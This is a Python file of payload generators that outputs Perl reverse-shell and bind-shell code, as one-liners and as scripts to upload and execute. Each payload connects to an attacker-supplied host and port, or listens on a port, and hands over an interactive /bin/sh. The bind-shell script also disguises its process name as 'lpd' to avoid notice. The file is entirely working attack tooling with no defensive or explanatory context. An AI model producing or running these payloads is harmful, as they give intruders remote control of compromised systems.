#!/usr/bin/python

def reverse_oneline(lhost, lport):
    """ Perl Reverse Shell Generator """
    payload = """perl -e 'use Socket;$i="%s";$p=%s;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'""" %(lhost, lport)
    return payload

def bind_oneline(lport):
    """ Perl Bind Shell Generator"""
    payload = """perl -e 'use Socket;$p=%s;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));bind(S,sockaddr_in($p, INADDR_ANY));listen(S, SOMAXCONN);for(; $p= accept(C, S); close C) {open(STDIN,">&C");open(STDOUT,">&C");open(STDERR,">&C");exec("/bin/sh -i");};'""" %(lport)
    return payload

def reverse_script(lhost, lport):
    """ Perl Reverse Shell, outputs a script to upload and execute"""
    shellcode = \
    """
use IO::Socket;
$system = '/bin/sh';
$port = "%s";
$host = "%s";
use Socket;
use FileHandle;
socket(SOCKET, PF_INET, SOCK_STREAM, getprotobyname('tcp'));
connect(SOCKET, sockaddr_in($port, inet_aton($host)));
SOCKET->autoflush();
open(STDIN, ">&SOCKET");
open(STDOUT,">&SOCKET");
open(STDERR,">&SOCKET");
system($system);
    """ %(lport, lhost)
    payload = shellcode
    return payload


def bind_script(lport):
    """Perl Bind Shell Script to upload and execute"""
    shellcode = \
    """
use Socket;

$port	= %s;
$proto	= getprotobyname('tcp');
$cmd	= "lpd";
$system	= 'echo "(`whoami`@`uname -n`:`pwd`)"; /bin/sh';

$0 = $cmd;

socket(SERVER, PF_INET, SOCK_STREAM, $proto)
					or die "socket:$!";
setsockopt(SERVER, SOL_SOCKET, SO_REUSEADDR, pack("l", 1))
					or die "setsockopt: $!";
bind(SERVER, sockaddr_in($port, INADDR_ANY))
					or die "bind: $!";
listen(SERVER, SOMAXCONN)		or die "listen: $!";

for(; $paddr = accept(CLIENT, SERVER); close CLIENT)
{
	open(STDIN, ">&CLIENT");
	open(STDOUT, ">&CLIENT");
	open(STDERR, ">&CLIENT");

	system($system);

	close(STDIN);
	close(STDOUT);
	close(STDERR);
} 
    """ %(lport)
    payload = shellcode
    return payload
